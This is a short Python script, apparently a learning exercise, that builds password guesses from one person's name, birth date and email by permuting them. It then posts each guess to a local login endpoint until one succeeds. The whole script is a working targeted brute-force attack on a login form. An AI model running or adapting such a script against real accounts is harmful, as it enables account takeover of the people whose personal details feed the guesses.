import itertools

import requests

person_data = [
    "anton",  # Имя
    "petrovich",  # Отчество
    "kalinkin",  # Фамилия
    "1975",  # Полный год рождения
    "75",  # Сокращенный год рождения
    "11",  # Месяц рождения
    "26",  # День рождения
    "ander@mail.ru",  # электронный адрес
    "ander",  # имя электронного адреса до знака @
]


def password_generation(lv):
    pop_passwords = []

    """Генерируем список паролей с n-сложностью"""
    for psw in itertools.permutations(person_data, lv):
        pop_passwords.append(''.join(psw))
    return pop_passwords


def search_for_passwords_on_the_server(arr):  # [1,1,2,3]  / [1,2,3,4,4,5,65,6,6]
    login = 'anton'
    i = 0
    stop = False

    while i < len(arr):
        password = arr[i]
        data = {'login': login, 'password': password}
        i += 1
        response = requests.post('http://127.0.0.1:5000/auth', json=data)
        if response.status_code == 200:
            print(data)
            stop = True
            break
    return stop


level = 1  # начальная сложность для itertools
max_level = len(person_data)  # лимит генерации
while True:
    proc = search_for_passwords_on_the_server(password_generation(level))
    if not proc and level < max_level:
        level += 1
    else:
        break

# users.json
# {
#     "anton": "11kalinkin75ander"
# }